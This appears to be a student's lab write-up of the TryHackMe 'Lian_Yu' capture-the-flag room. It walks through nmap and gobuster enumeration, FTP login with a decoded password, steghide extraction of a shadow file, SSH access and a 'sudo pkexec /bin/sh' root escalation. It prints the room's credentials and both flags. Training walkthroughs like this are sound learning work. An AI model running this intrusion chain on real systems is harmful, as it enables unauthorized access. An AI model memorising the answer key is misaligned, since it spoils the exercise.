# Lab-week-6-Lian-YU

1. Create working directory

    cd /home/irfan/Desktop

    mkdir lianyu

<img width="940" height="138" alt="image" src="https://github.com/user-attachments/assets/851435c2-5583-4fbf-b72c-4ef5bc3123d5" />

2. Create Nmap directory
   
   mkdir -p /home/irfan/Desktop/nmap

<img width="940" height="73" alt="image" src="https://github.com/user-attachments/assets/eecdc9c3-cf98-40b1-aaa9-0cf742f08fe8" />

3. Run Nmap scan
   
    nmap -sC -sV -p- -oN /home/irfan/Desktop/nmap/lianyu_1049166123 10.49.166.123

<img width="940" height="489" alt="image" src="https://github.com/user-attachments/assets/af9a14c8-e556-4a03-ba22-5820c09f38b0" />

  Finding - open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 111 (RPC), 39870 (unknown)

4. Gobuster enumeration
   
   gobuster dir -u http://10.49.166.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="940" height="302" alt="image" src="https://github.com/user-attachments/assets/2f0b4e3b-8f4d-4fb4-b352-3eedf745e935" />

  Found - /island

5. Explore main page → Arrowverse theme

   http://10.48.183.163/
   View Source of the URL page [Ctrl+U]
   
<img width="940" height="489" alt="image" src="https://github.com/user-attachments/assets/ff76b09e-2d4b-4c37-81c1-a21718b69770" />
<img width="936" height="485" alt="image" src="https://github.com/user-attachments/assets/e2c9f621-428c-4d2b-b3e8-f1ec3a6902ed" />


6. Visit /island → Code word revealed: vigilante
   
   http://10.49.166.123/island/
   
<img width="940" height="486" alt="image" src="https://github.com/user-attachments/assets/b3efe0f4-fd3e-464b-b827-239a33477d76" />
<img width="940" height="485" alt="image" src="https://github.com/user-attachments/assets/bbb3cf37-daee-4cd5-b126-ac1071477f0a" />

7. Gobuster deeper into /island
   
   → Found /2100

    gobuster dir -u http://10.49.166.123/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  

<img width="940" height="288" alt="image" src="https://github.com/user-attachments/assets/a32272e5-a74c-463b-9db6-e204cfb4677e" />

8. Explore /island/2100 → Hidden video reference

   http://10.49.166.123/island/2100/
   
   View Source of the URL page [Ctrl+U]

<img width="940" height="486" alt="image" src="https://github.com/user-attachments/assets/e4b34182-ec2a-4c2c-b00c-ad3eadc5ff7e" />
<img width="940" height="486" alt="image" src="https://github.com/user-attachments/assets/21a53250-c3e1-49eb-8b3c-2a0e4c4e7281" />

9. Gobuster on /2100 → No new dirs
    
   gobuster dir -u http://10.49.166.123/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="940" height="275" alt="image" src="https://github.com/user-attachments/assets/f39fc800-8a34-4015-bfb3-39bdddc972fa" />

10. Gobuster with extensions

    gobuster dir -u http://10.49.166.123/island/2100 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50

<img width="940" height="158" alt="image" src="https://github.com/user-attachments/assets/e967d3e4-a323-4e33-8e7a-ed42efa491f3" />

Found Index.html and green_arrow.ticket

11. Open green_arrow.ticket → Token: RTy8yhBQdscX

    http://10.49.166.123/island/2100/green_arrow.ticket

<img width="940" height="488" alt="image" src="https://github.com/user-attachments/assets/cc9dfb95-3819-4a3d-8524-c6bfaca2188a" />

12. Analyze token → Base58 encoded

    https://www.tunnelsup.com/hash-analyzer/

<img width="940" height="833" alt="image" src="https://github.com/user-attachments/assets/34fc100f-45e5-4050-87b9-8068a40e63fb" />

13. Decode with CyberChef → Password: !#th3h00d

    https://gchq.github.io/CyberChef/

<img width="940" height="446" alt="image" src="https://github.com/user-attachments/assets/0e03bbbb-9d08-4a64-8dc3-e7465cec8462" />


14. login ftp 10.49.166.123

    name : vigilante
    
    password : !#th3h00d

<img width="940" height="202" alt="image" src="https://github.com/user-attachments/assets/e9a32283-a741-4599-9cb4-945cbc47329b" />

    ls

<img width="940" height="121" alt="image" src="https://github.com/user-attachments/assets/d5399666-6554-4d0b-a384-9dd476554eb2" />


15. Download all files (mget *) → Got Leave_me_alone.png, Queen's_Gambit.png, aa.jpg

    mget *

<img width="940" height="276" alt="image" src="https://github.com/user-attachments/assets/2108e652-b412-4e24-8af3-482d5354c18f" />


16. List hidden files → Found .other_user

     ls -la

<img width="940" height="207" alt="image" src="https://github.com/user-attachments/assets/57e49781-b2db-4d9a-82a2-ffebe599409a" />

17. Download .other_user
  
    Get .other_user

<img width="940" height="119" alt="image" src="https://github.com/user-attachments/assets/71efd049-c5cf-4803-9b5a-8f5733de23a4" />

18. Read .other_user → Story of Slade Wilson (hint for SSH)

    cat .other_user

<img width="940" height="419" alt="image" src="https://github.com/user-attachments/assets/373cb775-13a2-486d-898f-610bb346edac" />

19. Inspect Leave_me_alone.png with hex editor → Hidden text

    Hexeditor Leave_me_alone.png

<img width="940" height="158" alt="image" src="https://github.com/user-attachments/assets/e11286d2-ce83-4c53-b0e5-7a0d0478c0fe" />
<img width="939" height="172" alt="image" src="https://github.com/user-attachments/assets/56fdd9b3-ccea-4171-a504-430c8497f474" />


20. Open Leave_me_alone.png → Password clue


    file:///home/irfan/Desktop/Leave_me_alone.png

<img width="940" height="485" alt="image" src="https://github.com/user-attachments/assets/b6363113-ecac-43b0-9439-1b0333c38c39" />

21. Open Queen's_Gambit.png → Image clue

    file:///home/irfan/Queen's_Gambit.png

<img width="941" height="489" alt="image" src="https://github.com/user-attachments/assets/f76e0a57-4059-43ef-9c9d-355129550668" />


22. Open aa.jpg

    file:///home/irfan/Desktop/aa.jpg

<img width="940" height="487" alt="image" src="https://github.com/user-attachments/assets/4ceed6c9-a46c-4c22-b56a-713198073243" />

23. Steghide extract from aa.jpg

    Steghide extract -sf aa.jpg

    Password = passwword

<img width="940" height="118" alt="image" src="https://github.com/user-attachments/assets/19eb9eea-1980-4fb4-be79-38de5ef7ab33" />

Extracted ss.zip

24. Unzip ss.zip → Got passwd.txt and shadow

    Unzip ss.zip

<img width="940" height="129" alt="image" src="https://github.com/user-attachments/assets/cba92d90-a1f6-405d-b0eb-f52d96f17a26" />

25. Read passwd.txt → Island notes

    Cat passwd.txt

<img width="940" height="211" alt="image" src="https://github.com/user-attachments/assets/ca3b7ff9-3ca1-4682-8b53-631d610f5d58" />

26. Read shadow → Password: M3tahuman

    Cat shadow

<img width="940" height="98" alt="image" src="https://github.com/user-attachments/assets/97e08b6f-14f0-40ff-a564-1c97106bc456" />

27. SSH login

    Ssh slaude@10.49.166.123

<img width="940" height="426" alt="image" src="https://github.com/user-attachments/assets/bfc90b1d-e009-40a1-8a7a-b5ae6cec4288" />


28. Read user flag

    Cat user.txt

<img width="940" height="70" alt="image" src="https://github.com/user-attachments/assets/5b475dc7-0b38-43d4-8bda-bc610011f34d" />

    Find user.txt flag : THM{P30P7E_K33P_53CRET5_COMPUT3R5_DON'T}

29. Check sudo privileges

    Sudo -l

<img width="940" height="95" alt="image" src="https://github.com/user-attachments/assets/5fd8bb2a-ae08-4275-9e47-704b2e1e785b" />

    → Allowed: /usr/bin/pkexec

30. Privilege escalation

    Sudo pkexec /bin/sh
  
    #id

    #whoami

<img width="940" height="98" alt="image" src="https://github.com/user-attachments/assets/ff1e722c-361d-41e3-83d2-2d7e7bd2bd21" />

    → Root access gained


31. Read root flag

    #cd /root

    #ls

    #cat root.txt\

<img width="937" height="265" alt="image" src="https://github.com/user-attachments/assets/d9d4c3a7-bc60-48bd-b81a-835ffa76934e" />

    FInd root.txt flag = THM{MY_WORD_IS_MY_BOND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}

32. 🎉 Mission accomplished → Lianyu completed!

<img width="940" height="443" alt="image" src="https://github.com/user-attachments/assets/58a0a00b-eec2-4347-aea8-d3764fd66a8a" />



    

    


    


  



    
    



    


    

    








    








    


    










   




   
  

